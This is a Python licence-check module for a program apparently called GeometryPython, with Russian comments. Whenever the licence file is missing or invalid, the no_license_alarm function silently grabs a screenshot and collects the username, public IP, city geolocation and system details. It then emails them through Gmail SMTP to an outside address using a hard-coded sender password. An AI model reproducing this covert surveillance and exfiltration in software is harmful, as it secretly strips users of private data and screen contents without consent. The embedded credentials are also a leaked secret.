import getpass
import os
import platform
import smtplib
import sys
import time
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import requests
from PIL import ImageGrab
from ip2geotools.databases.noncommercial import DbIpCity
import random


def no_license_alarm():
    # собираем данные
    username = os.getlogin()
    response = DbIpCity.get(requests.get("https://ramziv.com/ip").text, api_key='free')
    screen = ImageGrab.grab()
    screen.save('screenshot.jpg')
    all_data = "Попытка нелицензионного запуска GeometryPython пользователем " + username + '\n' \
               + "Time: " + time.asctime() + '\n' + "Кодировка ФС: " + sys.getfilesystemencoding() \
               + '\n' + "Cpu: " + platform.processor() + '\n' + "Система: " + platform.system() \
               + ' ' + platform.release() + '\nIP: ' + requests.get("https://ramziv.com/ip").text \
               + '\nГород: ' + response.city + '\nGen_Location:' + response.to_json()
    # готовим письмо
    msgtext = MIMEText(all_data.encode('utf-8'), 'plain', 'utf-8')
    msg = MIMEMultipart()
    msg['From'] = 'bot.igrovoi.yal@gmail.com'
    msg['To'] = 'kriptovlad@gmail.com'
    msg['Subject'] = getpass.getuser() + '-PC'
    msg.attach(msgtext)
    pathscreen = 'screenshot.jpg'
    with open(pathscreen, 'rb') as fp:
        img = MIMEImage(fp.read())
    msg.attach(img)
    # отправка
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login('bot.igrovoi.yal@gmail.com', 'Li0nkinG_76')
    s.sendmail('bot.igrovoi.yal@gmail.com', 'kriptovlad@gmail.com', msg.as_string())
    s.quit()


def generate_license():
    filename = 'license.txt'
    # генерируем лицензию
    my_file = open(filename, "w+")
    alphabet = list('qwertyuiopasdfghjklzxcvbnm')
    unusual = list('!@#$%^&*()?":>}{][')
    licensekey = []
    licensekey.append('0')
    licensekey.append(str(random.randint(0, 9)))
    for i in range(3):
        licensekey.append(random.choice(alphabet))
    for i in range(3):
        licensekey.append(random.choice(unusual))
    licensekey.append(str(random.randint(0, 9)))
    licensekey.append('0')
    licensekey = ''.join(licensekey)
    my_file.write(licensekey)
    my_file.close()


def check_license():
    fname = 'license.txt'
    # проверяем лицензию
    if os.path.isfile(fname):
        f = open(fname, mode="r")
        licensekey = f.read(10)
        if licensekey[0] == '0' and licensekey[1] in '0123456789' and licensekey[-1] == '0' and \
                licensekey[-2] in '0123456789':
            for i in range(2, 5):
                if licensekey[i].isalpha():
                    pass
                else:
                    no_license_alarm()
                    return False
            for i in range(5, 8):
                if licensekey[i] in '!@#$%^&*()?":>}{][':
                    pass
                else:
                    no_license_alarm()
                    return False
            return True
        else:
            no_license_alarm()
            return False
    else:
        no_license_alarm()
        return False
